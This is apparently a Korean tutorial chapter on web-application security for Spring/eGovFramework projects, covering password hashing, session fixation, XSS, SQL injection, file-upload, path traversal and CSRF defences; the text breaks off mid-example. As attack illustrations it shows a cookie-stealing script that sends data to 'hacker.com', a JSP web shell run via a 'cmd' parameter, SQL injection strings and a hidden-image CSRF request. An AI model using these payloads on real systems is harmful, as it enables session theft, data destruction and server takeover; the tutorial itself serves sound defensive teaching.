# 6. 보안 (Security) - 실무 필수 사항

이 문서는 **실제 서비스 배포 전 반드시 구현해야 하는 보안 기능**들을 다룹니다.
공공기관 프로젝트에서는 ISMS-P 인증, 개인정보보호법 준수를 위해 **필수**로 요구되는 내용입니다.

---

## 1. 비밀번호 암호화 (18강)

평문 비밀번호를 DB에 저장하거나 비교하는 것은 **개인정보보호법 위반**입니다.
반드시 암호화 알고리즘을 사용해야 합니다.

### 1.1 왜 평문 저장이 위험한가?

**시나리오 1: DB 유출 시**
```sql
--  평문 저장 (위험!)
SELECT * FROM USERS;
ID    | PASSWORD
------|----------
admin | admin123
user1 | password

--> 해커가 DB 덤프 파일만 얻으면 모든 계정 탈취 가능
```

**시나리오 2: 로그 파일 노출**
```java
//  위험한 코드
LOGGER.info("로그인 시도 - ID: " + id + ", PW: " + password);
--> 로그 파일이 노출되면 비밀번호 그대로 유출
```

### 1.2 암호화 알고리즘 선택

| 알고리즘 | 특징 | 실무 사용 |
|---------|------|----------|
| **MD5** | 빠르지만 취약 (Rainbow Table 공격 가능) |  사용 금지 |
| **SHA-256** | 빠른 해싱 알고리즘 | ⚠️ 단독 사용 위험 |
| **BCrypt** | 의도적으로 느리게 설계 (Brute Force 방어) |  **강력 추천** |
| **PBKDF2** | 전자정부 표준, 반복 횟수 설정 가능 |  공공기관 필수 |

### 1.3 라이브러리 추가 (`pom.xml`)

#### 방법 1: Spring Security (가장 많이 사용)
```xml
<!-- Spring Security -->
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-core</artifactId>
    <version>5.3.13.RELEASE</version>
</dependency>
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-crypto</artifactId>
    <version>5.3.13.RELEASE</version>
</dependency>
```

#### 방법 2: 전자정부 프레임워크 표준
```xml
<!-- 전자정부 암호화 모듈 (이미 포함되어 있을 수 있음) -->
<dependency>
    <groupId>egovframework.rte</groupId>
    <artifactId>egovframework.rte.fdl.crypto</artifactId>
    <version>${egovframework.rte.version}</version>
</dependency>
```

### 1.4 Spring 설정 (`context-security.xml`)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
                           http://www.springframework.org/schema/beans/spring-beans.xsd">

    <!-- BCrypt 암호화 Bean 등록 -->
    <bean id="passwordEncoder" class="org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder">
        <!-- strength: 암호화 강도 (4~31, 기본 10) -->
        <!-- 숫자가 클수록 안전하지만 느림. 실무에서는 10~12 사용 -->
        <constructor-arg name="strength" value="10"/>
    </bean>

</beans>
```

### 1.5 회원가입 시 암호화 (Service)

```java
import org.springframework.security.crypto.password.PasswordEncoder;

@Service("userService")
public class UserServiceImpl implements UserService {

    @Resource(name = "userDAO")
    private UserDAO userDAO;

    @Resource(name = "passwordEncoder")
    private PasswordEncoder passwordEncoder;

    @Override
    public void insertUser(UserVO userVO) throws Exception {

        // [중요] 평문 비밀번호를 암호화
        String rawPassword = userVO.getPassword();
        String encodedPassword = passwordEncoder.encode(rawPassword);

        // 암호화된 비밀번호를 VO에 다시 세팅
        userVO.setPassword(encodedPassword);

        // DB 저장
        userDAO.insertUser(userVO);
    }
}
```

**DB에 저장되는 모습:**
```sql
-- 평문: admin123
-- 암호화: $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

--> 같은 비밀번호를 입력해도 매번 다른 해시가 생성됨 (Salt 포함)
```

### 1.6 로그인 시 검증 (Service)

** 절대 이렇게 하지 마세요:**
```java
// 위험한 코드 (평문 비교)
public LoginVO login(String id, String password) {
    LoginVO user = dao.selectUser(id);
    if (user != null && user.getPassword().equals(password)) {
        return user;
    }
    return null;
}
```

** 올바른 방법:**
```java
import org.springframework.security.crypto.password.PasswordEncoder;

@Service("loginService")
public class LoginServiceImpl implements LoginService {

    @Resource(name = "loginDAO")
    private LoginDAO loginDAO;

    @Resource(name = "passwordEncoder")
    private PasswordEncoder passwordEncoder;

    @Override
    public LoginVO login(String userId, String rawPassword) throws Exception {

        // 1. DB에서 사용자 조회 (ID로만 조회)
        LoginVO user = loginDAO.selectUserById(userId);

        if (user == null) {
            // 사용자가 존재하지 않음
            return null;
        }

        // 2. 비밀번호 검증
        // passwordEncoder.matches(평문, 암호화된문자열)
        boolean isPasswordMatch = passwordEncoder.matches(rawPassword, user.getPassword());

        if (isPasswordMatch) {
            // 로그인 성공
            return user;
        } else {
            // 비밀번호 불일치
            return null;
        }
    }
}
```

**Mapper XML 수정:**
```xml
<!-- 기존: ID와 비밀번호로 조회 () -->
<select id="selectUser" resultType="loginVO">
    SELECT * FROM USERS
    WHERE USER_ID = #{userId}
      AND PASSWORD = #{password}  <!-- 평문 비교는 불가능 -->
</select>

<!-- 변경: ID로만 조회 () -->
<select id="selectUserById" resultType="loginVO" parameterType="string">
    SELECT
        USER_ID,
        PASSWORD,  -- 암호화된 비밀번호
        NAME,
        EMAIL
    FROM USERS
    WHERE USER_ID = #{userId}
</select>
```

### 1.7 Controller (변경 없음)

```java
@RequestMapping("/loginAction.do")
public String loginAction(
        @RequestParam("userId") String userId,
        @RequestParam("password") String password,
        HttpServletRequest request,
        Model model) throws Exception {

    // Service에서 암호화 검증 처리
    LoginVO user = loginService.login(userId, password);

    if (user != null) {
        // 로그인 성공
        request.getSession().setAttribute("LoginVO", user);
        return "redirect:/main.do";
    } else {
        // 로그인 실패
        model.addAttribute("message", "아이디 또는 비밀번호가 일치하지 않습니다.");
        return "login/login";
    }
}
```

---

## 2. 세션 보안 (19강)

웹은 HTTP 프로토콜을 사용하므로 기본적으로 Stateless(무상태)입니다.
세션을 안전하게 관리하지 않으면 **세션 하이재킹**, **세션 고정 공격**에 노출됩니다.

### 2.1 세션 고정 공격 (Session Fixation)

**공격 시나리오:**
1. 공격자가 미리 세션 ID(`JSESSIONID=ATTACK123`)를 발급받음
2. 피해자에게 `http://site.com/login.do;jsessionid=ATTACK123` 링크 전송
3. 피해자가 이 링크로 로그인
4. 공격자도 `JSESSIONID=ATTACK123`으로 접속 → **피해자 계정 탈취 성공**

### 2.2 방어 방법: 로그인 성공 시 새 세션 발급

** 위험한 코드:**
```java
@RequestMapping("/loginAction.do")
public String loginAction(HttpServletRequest request, ...) {
    LoginVO user = loginService.login(userId, password);
    if (user != null) {
        request.getSession().setAttribute("LoginVO", user);  // 기존 세션 재사용
    }
}
```

** 안전한 코드:**
```java
@RequestMapping("/loginAction.do")
public String loginAction(HttpServletRequest request, ...) throws Exception {

    LoginVO user = loginService.login(userId, password);

    if (user != null) {
        // [중요] 기존 세션 무효화
        HttpSession oldSession = request.getSession(false);
        if (oldSession != null) {
            oldSession.invalidate();
        }

        // 새로운 세션 생성
        HttpSession newSession = request.getSession(true);
        newSession.setAttribute("LoginVO", user);

        // 로그인 시간 기록 (선택사항)
        newSession.setAttribute("LOGIN_TIME", System.currentTimeMillis());

        return "redirect:/main.do";
    } else {
        return "login/login";
    }
}
```

### 2.3 세션 타임아웃 설정 (`web.xml`)

사용자가 일정 시간 동안 아무 작업도 하지 않으면 자동 로그아웃되도록 설정합니다.

```xml
<web-app ...>

    <!-- 세션 타임아웃 설정 (단위: 분) -->
    <session-config>
        <session-timeout>30</session-timeout>  <!-- 30분 -->
    </session-config>

</web-app>
```

### 2.4 인터셉터로 로그인 체크 (가장 중요!)

JSP에서 직접 세션 체크하는 것은 **모든 페이지에 중복 코드**가 생깁니다.
**인터셉터**를 사용하면 한 곳에서 일괄 처리 가능합니다.

**1) 인터셉터 클래스 작성**
```java
package egovframework.example.cmmn.interceptor;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.springframework.web.servlet.HandlerInterceptor;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class LoginInterceptor implements HandlerInterceptor {

    private static final Logger LOGGER = LoggerFactory.getLogger(LoginInterceptor.class);

    @Override
    public boolean preHandle(HttpServletRequest request,
                            HttpServletResponse response,
                            Object handler) throws Exception {

        // 1. 세션 확인 (false: 없으면 null 반환, 새로 생성하지 않음)
        HttpSession session = request.getSession(false);

        // 2. 로그인 체크
        if (session == null || session.getAttribute("LoginVO") == null) {
            // 로그인되지 않은 상태
            LOGGER.warn("비로그인 접근 시도 - URI: {}, IP: {}",
                       request.getRequestURI(),
                       request.getRemoteAddr());

            // 로그인 페이지로 리다이렉트
            response.sendRedirect(request.getContextPath() + "/login.do");
            return false;  // Controller로 진행하지 않음
        }

        // 3. 로그인된 상태 → 정상 진행
        return true;
    }
}
```

**2) 인터셉터 등록 (`egov-com-servlet.xml`)**
```xml
<beans ...>

    <!-- 인터셉터 Bean 등록 -->
    <bean id="loginInterceptor" class="egovframework.example.cmmn.interceptor.LoginInterceptor" />

    <!-- 인터셉터 적용 -->
    <mvc:interceptors>
        <mvc:interceptor>
            <!-- 로그인 체크가 필요한 URL 패턴 -->
            <mvc:mapping path="/board/**"/>
            <mvc:mapping path="/mypage/**"/>
            <mvc:mapping path="/admin/**"/>

            <!-- 로그인 체크 제외 URL (로그인 페이지는 제외해야 함!) -->
            <mvc:exclude-mapping path="/login.do"/>
            <mvc:exclude-mapping path="/loginAction.do"/>
            <mvc:exclude-mapping path="/register.do"/>

            <ref bean="loginInterceptor"/>
        </mvc:interceptor>
    </mvc:interceptors>

</beans>
```

### 2.5 세션 쿠키 보안 설정 (`web.xml`)

세션 ID가 담긴 쿠키(`JSESSIONID`)를 안전하게 전송하도록 설정합니다.

```xml
<web-app ...>

    <session-config>
        <session-timeout>30</session-timeout>

        <!-- 쿠키 보안 설정 -->
        <cookie-config>
            <!-- HttpOnly: JavaScript로 쿠키 접근 불가 (XSS 방어) -->
            <http-only>true</http-only>

            <!-- Secure: HTTPS에서만 쿠키 전송 (운영 환경에서만 true) -->
            <secure>false</secure>  <!-- 개발: false, 운영: true -->

            <!-- SameSite: CSRF 방어 (Spring 5.x 이상) -->
            <!-- <same-site>Strict</same-site> -->
        </cookie-config>
    </session-config>

</web-app>
```

---

## 3. XSS (Cross-Site Scripting) 방어 (20강)

악의적인 사용자가 게시판에 JavaScript 코드를 삽입하여 다른 사용자의 세션을 탈취하거나 악성 동작을 실행하는 공격입니다.

### 3.1 공격 시나리오

**시나리오 1: 게시판 제목에 스크립트 삽입**
```html
제목: <script>alert('해킹!');</script>
내용: 안녕하세요

--> 다른 사용자가 이 글을 보면 alert 창이 뜸
```

**시나리오 2: 세션 탈취**
```html
제목: 이벤트 당첨자 발표
내용: <script>
    // 사용자의 세션 쿠키를 공격자 서버로 전송
    var cookie = document.cookie;
    location.href = 'http://hacker.com/steal.php?cookie=' + cookie;
</script>

--> 사용자가 이 글을 보는 순간 세션 ID가 공격자에게 전송됨
```

### 3.2 방어 방법 1: JSP에서 `<c:out>` 사용

** 위험한 코드:**
```jsp
<!-- 사용자 입력값을 그대로 출력 -->
<h1>${board.title}</h1>
<div>${board.content}</div>

<!-- 만약 title이 "<script>alert('XSS')</script>"라면? -->
--> 브라우저가 실행해버림
```

** 안전한 코드:**
```jsp
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>

<!-- c:out은 HTML 특수문자를 자동 이스케이프 -->
<h1><c:out value="${board.title}" /></h1>
<div><c:out value="${board.content}" escapeXml="true" /></div>

<!-- 변환 결과: -->
<!-- <script> → &lt;script&gt; -->
<!-- 브라우저는 이를 문자열로 인식, 실행하지 않음 -->
```

### 3.3 방어 방법 2: Lucy XSS Filter (네이버 오픈소스)

네이버에서 만든 XSS 방어 라이브러리로, **전자정부 프레임워크 표준 도구**입니다.

**1) 라이브러리 추가 (`pom.xml`)**
```xml
<!-- Lucy XSS Servlet Filter -->
<dependency>
    <groupId>com.navercorp.lucy</groupId>
    <artifactId>lucy-xss-servlet</artifactId>
    <version>2.0.1</version>
</dependency>
```

**2) 필터 등록 (`web.xml`)**
```xml
<!-- XSS 방어 필터 (반드시 encodingFilter 다음에 와야 함) -->
<filter>
    <filter-name>xssEscapeServletFilter</filter-name>
    <filter-class>com.navercorp.lucy.security.xss.servletfilter.XssEscapeServletFilter</filter-class>
</filter>
<filter-mapping>
    <filter-name>xssEscapeServletFilter</filter-name>
    <url-pattern>*.do</url-pattern>
</filter-mapping>
```

**3) Lucy 설정 파일 (`src/main/resources/lucy-xss-servlet-filter-rule.xml`)**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<config xmlns="http://www.navercorp.com/lucy-xss-servlet">
    <defenders>
        <!-- XssPreventer: 모든 HTML 태그 제거 -->
        <defender>
            <name>xssPreventerDefender</name>
            <class>com.navercorp.lucy.security.xss.servletfilter.defender.XssPreventerDefender</class>
        </defender>

        <!-- XssSaxFilter: 안전한 HTML 태그만 허용 (게시판 에디터용) -->
        <defender>
            <name>xssSaxFilterDefender</name>
            <class>com.navercorp.lucy.security.xss.servletfilter.defender.XssSaxFilterDefender</class>
            <init-param>
                <param-value>lucy-xss-sax.xml</param-value>   <!-- 허용 태그 설정 파일 -->
                <param-value>false</param-value>              <!-- 기본 차단 -->
            </init-param>
        </defender>
    </defenders>

    <!-- 기본 정책: 모든 파라미터에 XssPreventer 적용 -->
    <default>
        <defender>xssPreventerDefender</defender>
    </default>

    <!-- URL 패턴별 정책 -->
    <url-rule-set>
        <!-- 게시판 글쓰기/수정: HTML 에디터 허용 -->
        <url-rule>
            <url>/board/insert.do</url>
            <url>/board/update.do</url>
            <param name="content">
                <defender>xssSaxFilterDefender</defender>
            </param>
        </url-rule>
    </url-rule-set>
</config>
```

**4) 허용 태그 설정 (`src/main/resources/lucy-xss-sax.xml`)**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<config xmlns="http://www.navercorp.com/lucy-xss">
    <elementRule>
        <!-- 허용할 HTML 태그 -->
        <element name="p" disable="false"/>
        <element name="br" disable="false"/>
        <element name="strong" disable="false"/>
        <element name="em" disable="false"/>
        <element name="span" disable="false">
            <attribute name="style">
                <!-- style 속성에서 허용할 CSS -->
                <allowedPattern><![CDATA[(?:(?:color|background-color)\s*:\s*(?:#[0-9a-fA-F]{3,6}|rgb\([0-9,\s]+\)))]]></allowedPattern>
            </attribute>
        </element>

        <!-- 위험한 태그는 차단 -->
        <element name="script" disable="true"/>
        <element name="iframe" disable="true"/>
        <element name="object" disable="true"/>
        <element name="embed" disable="true"/>
    </elementRule>

    <attributeRule>
        <!-- 이벤트 핸들러 속성 전부 차단 -->
        <attribute name="onclick" base64Encoding="true"/>
        <attribute name="onerror" base64Encoding="true"/>
        <attribute name="onload" base64Encoding="true"/>
    </attributeRule>
</config>
```

**효과:**
```java
// Controller에서 받은 값
String title = "<script>alert('XSS')</script>안녕하세요";

// Lucy Filter가 자동으로 변환
// title = "&lt;script&gt;alert('XSS')&lt;/script&gt;안녕하세요"

// 개발자는 아무것도 안 해도 됨!
```

### 3.4 방어 방법 3: Spring에서 직접 이스케이프

```java
import org.springframework.web.util.HtmlUtils;

@Controller
public class BoardController {

    @RequestMapping("/boardInsert.do")
    public String insert(@ModelAttribute BoardVO boardVO) throws Exception {

        // HTML 특수문자 이스케이프
        String safeTitle = HtmlUtils.htmlEscape(boardVO.getTitle());
        String safeContent = HtmlUtils.htmlEscape(boardVO.getContent());

        boardVO.setTitle(safeTitle);
        boardVO.setContent(safeContent);

        boardService.insertBoard(boardVO);
        return "redirect:/boardList.do";
    }
}
```

---

## 4. SQL Injection 방어 (21강)

악의적인 사용자가 입력값에 SQL 구문을 삽입하여 데이터베이스를 조작하는 공격입니다.

### 4.1 공격 시나리오

**시나리오 1: 로그인 우회**
```sql
-- 정상 쿼리
SELECT * FROM USERS WHERE USER_ID = 'admin' AND PASSWORD = 'admin123'

-- 공격자가 ID에 "admin' OR '1'='1" 입력
SELECT * FROM USERS WHERE USER_ID = 'admin' OR '1'='1' AND PASSWORD = ''

--> '1'='1'은 항상 참이므로 비밀번호 없이 로그인 성공
```

**시나리오 2: 데이터 삭제**
```sql
-- 정상 쿼리
SELECT * FROM BOARD WHERE BOARD_ID = 10

-- 공격자가 "10; DROP TABLE BOARD--" 입력
SELECT * FROM BOARD WHERE BOARD_ID = 10; DROP TABLE BOARD--

--> 게시판 테이블이 통째로 삭제됨
```

### 4.2 MyBatis에서 `#{}` vs `${}` 차이 (가장 중요!)

| 구분 | `#{}` (PreparedStatement) | `${}` (문자열 치환) |
|------|--------------------------|---------------------|
| **SQL 생성** | `WHERE id = ?` | `WHERE id = 'admin'` |
| **방어** |  SQL Injection 방어 |  방어 불가 |
| **사용 시기** | 일반 파라미터 (기본) | ORDER BY, 테이블명 등 |

** 절대 이렇게 하지 마세요:**
```xml
<select id="selectUser" resultType="loginVO">
    SELECT * FROM USERS
    WHERE USER_ID = '${userId}'  <!-- 위험! -->
</select>
```

** 올바른 방법:**
```xml
<select id="selectUser" resultType="loginVO" parameterType="string">
    SELECT * FROM USERS
    WHERE USER_ID = #{userId}  <!-- 안전 -->
</select>
```

**실제 실행되는 쿼리:**
```sql
-- #{userId} 사용 시
SELECT * FROM USERS WHERE USER_ID = ?
--> PreparedStatement로 실행, 파라미터는 'admin' (SQL 구문 인식 불가)

-- ${userId} 사용 시
SELECT * FROM USERS WHERE USER_ID = 'admin' OR '1'='1'
--> 그대로 실행됨 (공격 성공)
```

### 4.3 LIKE 검색 시 주의사항

** 틀린 방법:**
```xml
<select id="searchBoard">
    SELECT * FROM BOARD
    WHERE TITLE LIKE '%${keyword}%'  <!-- 위험! -->
</select>
```

** 올바른 방법 (PostgreSQL/MySQL):**
```xml
<select id="searchBoard" parameterType="searchVO">
    SELECT * FROM BOARD
    WHERE TITLE LIKE CONCAT('%', #{keyword}, '%')
</select>
```

** 올바른 방법 (Oracle):**
```xml
<select id="searchBoard" parameterType="searchVO">
    SELECT * FROM BOARD
    WHERE TITLE LIKE '%' || #{keyword} || '%'
</select>
```

### 4.4 ORDER BY 동적 정렬 (예외 케이스)

ORDER BY 절에는 `#{}`를 사용할 수 없습니다. (컬럼명은 PreparedStatement로 바인딩 불가)
이 경우에만 **화이트리스트 검증 후 `${}`** 사용이 허용됩니다.

** 위험한 코드:**
```xml
<select id="selectBoardList">
    SELECT * FROM BOARD
    ORDER BY ${sortColumn} ${sortOrder}  <!-- 검증 없이 사용 위험 -->
</select>
```

** 안전한 코드 (Service에서 검증):**
```java
@Service
public class BoardServiceImpl {

    // 허용된 정렬 컬럼 화이트리스트
    private static final List<String> ALLOWED_SORT_COLUMNS =
        Arrays.asList("BOARD_ID", "TITLE", "WRITE_DAY", "SEE_COUNT");

    private static final List<String> ALLOWED_SORT_ORDERS =
        Arrays.asList("ASC", "DESC");

    public List<?> selectBoardList(SearchVO searchVO) throws Exception {

        // 정렬 컬럼 검증
        String sortColumn = searchVO.getSortColumn();
        if (!ALLOWED_SORT_COLUMNS.contains(sortColumn)) {
            sortColumn = "BOARD_ID";  // 기본값
        }

        // 정렬 순서 검증
        String sortOrder = searchVO.getSortOrder().toUpperCase();
        if (!ALLOWED_SORT_ORDERS.contains(sortOrder)) {
            sortOrder = "DESC";  // 기본값
        }

        searchVO.setSortColumn(sortColumn);
        searchVO.setSortOrder(sortOrder);

        return boardDAO.selectBoardList(searchVO);
    }
}
```

```xml
<!-- Mapper XML -->
<select id="selectBoardList" resultType="egovMap">
    SELECT * FROM BOARD
    ORDER BY ${sortColumn} ${sortOrder}  <!-- Service에서 검증했으므로 안전 -->
</select>
```

### 4.5 IN 절 처리

**여러 개의 ID를 받아서 조회하는 경우:**
```xml
<select id="selectBoardsByIds" resultType="boardVO">
    SELECT * FROM BOARD
    WHERE BOARD_ID IN
    <foreach collection="list" item="id" open="(" separator="," close=")">
        #{id}  <!-- 각 id를 안전하게 바인딩 -->
    </foreach>
</select>
```

**Java 코드:**
```java
List<Integer> ids = Arrays.asList(1, 2, 3, 4, 5);
List<BoardVO> boards = boardDAO.selectBoardsByIds(ids);

// 실행되는 쿼리:
// SELECT * FROM BOARD WHERE BOARD_ID IN (?, ?, ?, ?, ?)
```

---

## 5. 파일 업로드 보안 (22강)

파일 업로드는 **가장 위험한 기능** 중 하나입니다. 제대로 검증하지 않으면 웹쉘을 업로드하여 서버를 장악당할 수 있습니다.

### 5.1 공격 시나리오

**시나리오 1: JSP 웹쉘 업로드**
```jsp
<!-- hacker.jsp -->
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    // ... 결과 출력 코드 ...
%>

<!-- 공격자가 이 파일을 업로드하고 -->
http://site.com/uploads/hacker.jsp?cmd=cat /etc/passwd
--> 서버의 모든 파일을 읽을 수 있음
```

**시나리오 2: 경로 조작 (Path Traversal)**
```java
// 사용자가 파일명에 "../../etc/passwd" 입력
String fileName = "../../etc/passwd";
file.transferTo(new File("/uploads/" + fileName));
--> /uploads/../../etc/passwd = /etc/passwd 덮어쓰기
```

### 5.2 방어 방법 1: 확장자 검증 (화이트리스트)

** 블랙리스트 방식 (위험):**
```java
// jsp, php만 막음 → jspx, phtml, php5 등으로 우회 가능
if (fileName.endsWith(".jsp") || fileName.endsWith(".php")) {
    throw new Exception("업로드 불가");
}
```

** 화이트리스트 방식 (안전):**
```java
import java.util.Arrays;
import java.util.List;

public class FileValidator {

    // 허용된 확장자 목록 (이것만 업로드 가능)
    private static final List<String> ALLOWED_EXTENSIONS = Arrays.asList(
        "jpg", "jpeg", "png", "gif",  // 이미지
        "pdf",                         // 문서
        "hwp", "doc", "docx",         // 한글/워드
        "xls", "xlsx",                // 엑셀
        "zip"                          // 압축파일
    );

    // 최대 파일 크기 (10MB)
    private static final long MAX_FILE_SIZE = 10 * 1024 * 1024;

    public static void validateFile(MultipartFile file) throws Exception {

        // 1. 파일 존재 여부
        if (file == null || file.isEmpty()) {
            throw new IllegalArgumentException("파일이 없습니다.");
        }

        String originalName = file.getOriginalFilename();

        // 2. 파일명 길이 체크
        if (originalName.length() > 255) {
            throw new IllegalArgumentException("파일명이 너무 깁니다.");
        }

        // 3. 확장자 추출 (소문자 변환)
        int lastDotIndex = originalName.lastIndexOf(".");
        if (lastDotIndex == -1) {
            throw new IllegalArgumentException("확장자가 없는 파일입니다.");
        }
        String extension = originalName.substring(lastDotIndex + 1).toLowerCase();

        // 4. 화이트리스트 검증
        if (!ALLOWED_EXTENSIONS.contains(extension)) {
            throw new IllegalArgumentException("허용되지 않는 파일 형식입니다: " + extension);
        }

        // 5. 파일 크기 체크
        if (file.getSize() > MAX_FILE_SIZE) {
            throw new IllegalArgumentException("파일 크기는 10MB 이하여야 합니다.");
        }

        // 6. 실제 파일 타입 검증 (MIME Type)
        String contentType = file.getContentType();
        if (extension.equals("jpg") || extension.equals("jpeg")) {
            if (!contentType.equals("image/jpeg")) {
                throw new IllegalArgumentException("JPG 파일이 아닙니다.");
            }
        } else if (extension.equals("png")) {
            if (!contentType.equals("image/png")) {
                throw new IllegalArgumentException("PNG 파일이 아닙니다.");
            }
        }
        // ... 다른 타입도 동일하게 체크
    }
}
```

### 5.3 방어 방법 2: 안전한 파일명 생성

```java
import java.util.UUID;
import java.io.File;

public class FileUploadUtil {

    // 업로드 경로 (반드시 웹 루트 밖에 위치)
    private static final String UPLOAD_PATH = "C:/uploads/";  // Windows
    // private static final String UPLOAD_PATH = "/var/uploads/";  // Linux

    public static String saveFile(MultipartFile file) throws Exception {

        // 1. 검증
        FileValidator.validateFile(file);

        String originalName = file.getOriginalFilename();
        String extension = originalName.substring(originalName.lastIndexOf("."));

        // 2. 안전한 파일명 생성 (UUID 사용)
        String savedName = UUID.randomUUID().toString() + extension;
        // 예: "a1b2c3d4-e5f6-4789-abcd-1234567890ab.jpg"

        // 3. 파일명에서 위험한 문자 제거 (추가 방어)
        savedName = savedName.replaceAll("[^a-zA-Z0-9._-]", "");

        // 4. 날짜별 디렉토리 생성 (선택사항)
        String datePath = new SimpleDateFormat("yyyy/MM/dd").format(new Date());
        String fullPath = UPLOAD_PATH + datePath + File.separator;

        File dir = new File(fullPath);
        if (!dir.exists()) {
            dir.mkdirs();  // 디렉토리 생성
        }

        // 5. 파일 저장
        File destFile = new File(fullPath + savedName);
        file.transferTo(destFile);

        // 6. DB 저장용 경로 반환
        return datePath + "/" + savedName;
        // 예: "2025/12/05/a1b2c3d4-e5f6-4789-abcd-1234567890ab.jpg"
    }
}
```

### 5.4 Controller 적용

```java
@Controller
public class BoardController {

    @RequestMapping("/boardInsert.do")
    public String insert(
            MultipartHttpServletRequest multiRequest,
            @ModelAttribute BoardVO boardVO) throws Exception {

        // 파일 처리
        Map<String, MultipartFile> files = multiRequest.getFileMap();

        for (MultipartFile file : files.values()) {
            if (!file.isEmpty()) {
                try {
                    // 안전하게 저장
                    String savedPath = FileUploadUtil.saveFile(file);

                    // VO에 세팅
                    boardVO.setFilename(file.getOriginalFilename());
                    boardVO.setFileurl(savedPath);

                } catch (IllegalArgumentException e) {
                    // 검증 실패 시 사용자에게 알림
                    model.addAttribute("message", e.getMessage());
                    return "board/write";
                }
            }
        }

        boardService.insertBoard(boardVO);
        return "redirect:/boardList.do";
    }
}
```

### 5.5 파일 다운로드 시 보안

** 위험한 코드:**
```java
@RequestMapping("/download.do")
public void download(@RequestParam("file") String fileName,
                     HttpServletResponse response) throws Exception {
    // 사용자가 "../../../etc/passwd" 입력 가능
    File file = new File("/uploads/" + fileName);
    // ...
}
```

** 안전한 코드:**
```java
@RequestMapping("/download.do")
public ResponseEntity<byte[]> download(@RequestParam("borderId") int borderId) throws Exception {

    // 1. DB에서 파일 정보 조회 (파라미터로 직접 경로 받지 않음!)
    BoardVO board = boardService.selectBoard(borderId);

    if (board == null || board.getFileurl() == null) {
        return new ResponseEntity<>(HttpStatus.NOT_FOUND);
    }

    // 2. 파일 경로 검증 (Path Traversal 방어)
    String fileUrl = board.getFileurl();
    if (fileUrl.contains("..") || fileUrl.contains("/") && !fileUrl.matches("^[0-9]{4}/[0-9]{2}/[0-9]{2}/[a-zA-Z0-9._-]+$")) {
        throw new SecurityException("비정상적인 파일 경로입니다.");
    }

    // 3. 파일 읽기
    File file = new File(UPLOAD_PATH + fileUrl);

    // 4. 파일 존재 여부 확인
    if (!file.exists() || !file.isFile()) {
        return new ResponseEntity<>(HttpStatus.NOT_FOUND);
    }

    // 5. 파일을 바이트 배열로 변환
    InputStream in = new FileInputStream(file);
    byte[] fileBytes = IOUtils.toByteArray(in);
    in.close();

    // 6. 응답 헤더 설정
    HttpHeaders headers = new HttpHeaders();

    // 한글 파일명 인코딩
    String originalName = board.getFilename();
    String encodedName = new String(originalName.getBytes("UTF-8"), "ISO-8859-1");

    headers.setContentType(MediaType.APPLICATION_OCTET_STREAM);
    headers.add("Content-Disposition", "attachment; filename=\"" + encodedName + "\"");

    return new ResponseEntity<>(fileBytes, headers, HttpStatus.OK);
}
```

---

## 6. CSRF (Cross-Site Request Forgery) 방어

로그인된 사용자가 의도하지 않은 요청을 서버에 보내도록 유도하는 공격입니다.

### 6.1 공격 시나리오

```html
<!-- 공격자가 만든 악성 페이지 (hacker.com) -->
<img src="http://bank.com/transfer.do?to=attacker&amount=1000000" style="display:none">

<!-- 사용자가 은행 사이트에 로그인한 상태로 이 페이지 방문 -->
--> 브라우저가 자동으로 이체 요청을 보냄 (세션 쿠키 포함)
--> 사용자 계좌에서 공격자에게 100만원 이체 성공
```

### 6.2 방어: CSRF 토큰 (Spring Security 사용)

**1) Spring Security 의존성 추가**
```xml
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-web</artifactId>
    <version>5.3.13.RELEASE</version>
</dependency>
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-config</artifactId>
    <version>5.3.13.RELEASE</version>
</dependency>
```

**2) CSRF 필터 등록 (`web.xml`)**
```xml
<filter>
    <filter-name>springSecurityFilterChain</filter-name>
    <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
</filter>
<filter-mapping>
    <filter-name>springSecurityFilterChain</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

**3) Spring Security 설정 (`context-security.xml`)**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans:beans xmlns="http://www.springframework.org/schema/security"
             xmlns:beans="http://www.springframework.org/schema/beans"
             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
             xsi:schemaLocation="http://www.springframework.org/schema/security
                                 http://www.springframework.org/schema/security/spring-security.xsd
                                 http://www.springframework.org/schema/beans
                                 http://www.springframework.org/schema/beans/spring-beans.xsd">

    <!-- CSRF 보호 활성화 (기본값: 활성화) -->
    <http auto-config="false" use-expressions="true">
        <csrf />  <!-- CSRF 토큰 자동 생성 및 검증 -->

        <!-- 로그인 없이 접근 가능한 페이지 -->
        <intercept-url pattern="/login.do" access="permitAll" />
        <intercept-url pattern="/resources/**" access="permitAll" />

        <!-- 나머지는 로그인 필요 -->
        <intercept-url pattern="/**" access="isAuthenticated()" />
    </http>

</beans:beans>
```

**4) JSP 폼에 토큰 추가**
```jsp
<%@ taglib prefix="sec" uri="http://www.springframework.org/security/tags" %>

<form action="/board/insert.do" method="post">

    <!-- CSRF 토큰 자동 추가 -->
    <sec:csrfInput />

    <!-- 또는 수동으로 -->
    <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}" />

    제목: <input type="text" name="title" /><br/>
    내용: <textarea name="content"></textarea><br/>
    <input type="submit" value="저장" />
</form>
```

**5) Ajax 요청 시**
```javascript
// 페이지 로드 시 CSRF 토큰 저장
var csrfToken = "${_csrf.token}";
var csrfHeader = "${_csrf.headerName}";

// Ajax 요청
$.ajax({
